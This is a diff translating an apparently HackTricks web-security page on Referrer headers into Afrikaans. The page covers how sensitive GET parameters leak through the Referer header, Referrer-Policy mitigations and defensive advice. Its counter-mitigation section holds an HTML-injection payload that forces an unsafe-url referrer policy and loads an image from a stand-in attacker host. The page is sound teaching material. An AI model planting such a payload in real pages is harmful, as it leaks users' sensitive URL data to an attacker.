@@ -1,17 +1,16 @@
 {{#include ../banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+# Verwysingskoppe en beleid
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+Verwysing is die kop wat deur blaaiers gebruik word om aan te dui watter die vorige bladsy was wat besoek is.
 
-## Sensitive information leaked
+## Sensitiewe inligting gelekt
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+As daar op 'n stadium binne 'n webblad enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat besoek 'n URL wat deur die aanvaller beheer word (sosiale ingenieurswese). Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek te eksfiltreer.
 
-## Mitigation
+## Versagting
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+Jy kan die blaier laat volg 'n **Verwysingsbeleid** wat die sensitiewe inligting kan **verhoed** om na ander webtoepassings gestuur te word:
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## Teen-Mitigering
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+Jy kan hierdie reël oorskry deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting benut):
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## Verdediging
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+Plaas nooit enige sensitiewe data in GET parameters of paden in die URL nie.
 
 {{#include ../banners/hacktricks-training.md}}
-
